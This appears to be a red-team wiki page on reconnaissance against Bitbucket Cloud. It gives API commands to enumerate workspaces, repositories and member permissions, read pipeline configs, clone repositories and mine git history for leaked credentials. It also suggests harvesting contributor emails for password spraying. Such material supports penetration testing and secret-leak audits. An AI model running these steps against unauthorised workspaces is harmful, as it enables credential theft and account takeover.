---
title: "Reconnaissance"
description: "Enumerating Bitbucket Cloud workspaces, projects, repositories, and members through the 2.0 API, reading source and bitbucket-pipelines.yml, and mining secrets from full clone history with manual git commands and history scanners."
keywords:
  - Bitbucket reconnaissance
  - workspace enumeration
  - secret harvesting
  - git history
  - bitbucket-pipelines.yml
---

# Reconnaissance

Reconnaissance on Bitbucket Cloud answers two questions: **what does my credential reach across the workspace -> project -> repository hierarchy**, and **what secrets already sit in the code and its history**. Everything runs against `https://api.bitbucket.org/2.0` with Basic auth (`username:app_password`) or Bearer auth (an access token), plus `git` over HTTPS for the deep history work.

## Fingerprint and preconditions

Before enumerating, confirm what the credential is and what it sees. A bare `/2.0/user` call that returns JSON means the credential is a user-bound app password or Atlassian API token; an access token resolves to a resource instead.

```bash
# Basic auth with an app password (username is the Atlassian account username, not the email)
curl -s -u "$BB_USER:$BB_APP_PASSWORD" https://api.bitbucket.org/2.0/user | jq '{username,account_id}'

# Bearer auth with a repository/project/workspace access token
curl -s -H "Authorization: Bearer $BB_TOKEN" https://api.bitbucket.org/2.0/user
```

A `401` on `/2.0/user` with a Bearer token is expected for a repository access token (it has no user identity); fall back to resource endpoints below. Unauthenticated requests still return metadata for any **public** repository and workspace, so run the repository listing with and without credentials to separate public exposure from private reach.

## Enumerating the hierarchy

Walk top-down. Workspaces first, then repositories, then the people and permissions attached to each.

```bash
AUTH=(-u "$BB_USER:$BB_APP_PASSWORD")

# Workspaces the credential belongs to
curl -s "${AUTH[@]}" https://api.bitbucket.org/2.0/workspaces | jq -r '.values[] | "\(.slug)\t\(.name)"'

# All repositories in a workspace, following pagination
next="https://api.bitbucket.org/2.0/repositories/ACME?pagelen=100"
while [ "$next" != "null" ] && [ -n "$next" ]; do
  page=$(curl -s "${AUTH[@]}" "$next")
  echo "$page" | jq -r '.values[] | "\(.full_name)\t\(.is_private)\t\(.mainbranch.name)"'
  next=$(echo "$page" | jq -r '.next // "null"')
done

# Members and their permission level (admin/write/read)
curl -s "${AUTH[@]}" https://api.bitbucket.org/2.0/workspaces/ACME/permissions | \
  jq -r '.values[] | "\(.user.nickname // .user.display_name)\t\(.permission)"'

# Projects (the optional grouping layer); a project key scopes repositories and project access tokens
curl -s "${AUTH[@]}" https://api.bitbucket.org/2.0/workspaces/ACME/projects | jq -r '.values[].key'
```

Interpret the output: `is_private=false` repositories are readable by anyone and are the first place to look for leaked secrets; a `permission` of `admin` on your own principal means you can add access tokens, SSH keys, and webhooks later. The `mainbranch.name` tells you which branch a default pipeline runs on.

## Reading source and the pipeline config without cloning

The `src` endpoint serves any file at any ref, which is fast for pulling the single most useful file in each repo, `bitbucket-pipelines.yml`:

```bash
# List the repo root at the main branch
curl -s "${AUTH[@]}" https://api.bitbucket.org/2.0/repositories/ACME/payments-api/src/HEAD/ | \
  jq -r '.values[].path'

# Pull the pipeline config directly
curl -s "${AUTH[@]}" \
  https://api.bitbucket.org/2.0/repositories/ACME/payments-api/src/HEAD/bitbucket-pipelines.yml
```

The pipeline config names which variables a build consumes (`$AWS_SECRET_ACCESS_KEY`, `$NPM_TOKEN`, deployment environment names). That tells you exactly what a Pipelines execution would hand you before you ever trigger one, and which repositories are worth the [Pipelines abuse](pipelines-abuse.md) path.

Where the workspace plan includes code search, grep across every repository at once:

```bash
curl -s "${AUTH[@]}" \
  "https://api.bitbucket.org/2.0/workspaces/ACME/search/code?search_query=aws_secret_access_key"
```

## Mining secrets from full history

Current `HEAD` is the least interesting place to look. Secrets are usually committed and then removed in a later commit, so they survive only in history. Clone with the credential embedded and scan the entire object graph.

```bash
# App password in the clone URL (URL-encode characters if needed)
git clone https://$BB_USER:$BB_APP_PASSWORD@bitbucket.org/ACME/payments-api.git
cd payments-api

# Every value ever assigned to a secret-looking key, across all history
git log -p --all -G'(secret|token|password|api[_-]?key|BEGIN [A-Z ]*PRIVATE KEY)' \
  | grep -iE '(secret|token|password|api[_-]?key|PRIVATE KEY)'

# Dangling and unreferenced blobs (content from deleted branches and amended commits)
git fsck --unreachable --no-reflogs 2>/dev/null | awk '/blob/ {print $3}' | \
  while read -r b; do git cat-file -p "$b"; done | grep -iE 'secret|token|password|AKIA[0-9A-Z]{16}'
```

Interpret a hit: a match inside a removed `.env`, a `settings.py`, or a CI config is a live credential until proven otherwise. An `AKIA...` plus a 40-char secret is an AWS long-term key; feed it to the [AWS](../../cloud/aws/index.md) path. A `ATBB...` or `ATCTT...` string is a Bitbucket app password or access token, which loops straight back into [Token and app-password abuse](token-and-app-password-abuse.md).

Automate the same sweep across every repository you enumerated:

```bash
for repo in $(curl -s "${AUTH[@]}" \
  "https://api.bitbucket.org/2.0/repositories/ACME?pagelen=100" | jq -r '.values[].full_name'); do
  git clone --quiet "https://$BB_USER:$BB_APP_PASSWORD@bitbucket.org/$repo.git" "/tmp/$repo" 2>/dev/null
  trufflehog git "file:///tmp/$repo" --only-verified
done
```

`--only-verified` keeps the output to credentials TruffleHog could actually authenticate with, which removes the noise of example values and rotated keys.

## Variants and follow-on

- **Downloads and artifacts**: `/2.0/repositories/ACME/{repo}/downloads/` often holds built archives and backups uploaded manually; they are not in `git` and so are missed by history scanners.
- **Issue and PR text**: `/2.0/repositories/ACME/{repo}/issues` and `/pullrequests` bodies and comments frequently paste tokens, internal hostnames, and connection strings.
- **Commit author harvesting**: `git log --all --format='%ae'` yields the Atlassian emails of every contributor, which seeds password spraying against Atlassian SSO and the Atlassian API token path.
- **Follow-on**: a `bitbucket-pipelines.yml` you can read plus write access to any branch is the handoff to [Pipelines abuse](pipelines-abuse.md); a harvested Bitbucket credential is the handoff to [Token and app-password abuse](token-and-app-password-abuse.md).

## Notes

- Bitbucket pagination uses a `next` URL, not a page counter; a loop that stops at the first page silently misses most repositories in large workspaces.
- Secured pipeline variable values are **not** returned by the API (they are write-only), so recon shows you the variable names but not their values; reading the values requires the Pipelines execution path.
- On Bitbucket Data Center/Server the equivalents are `/rest/api/1.0/projects`, `/rest/api/1.0/projects/{key}/repos`, and Bearer HTTP access tokens; there is no `bitbucket-pipelines.yml` because Server has no Pipelines.

## Tools

- **git** (`log -p -G`, `fsck --unreachable`, `cat-file`): manual history and dangling-object mining.
- **TruffleHog**: verified secret detection across full `git` history.
- **Gitleaks**: regex and entropy secret scanning of a clone or directory tree.
- **jq**: parsing and paginating the 2.0 API JSON responses.

## References

- [Bitbucket Cloud REST API: repositories](https://developer.atlassian.com/cloud/bitbucket/rest/api-group-repositories/)
- [Bitbucket Cloud REST API: workspaces](https://developer.atlassian.com/cloud/bitbucket/rest/api-group-workspaces/)
- [TruffleHog](https://github.com/trufflesecurity/trufflehog)
- [Gitleaks](https://github.com/gitleaks/gitleaks)
- [Atlassian: use the src endpoint to read files](https://developer.atlassian.com/cloud/bitbucket/rest/api-group-source/)
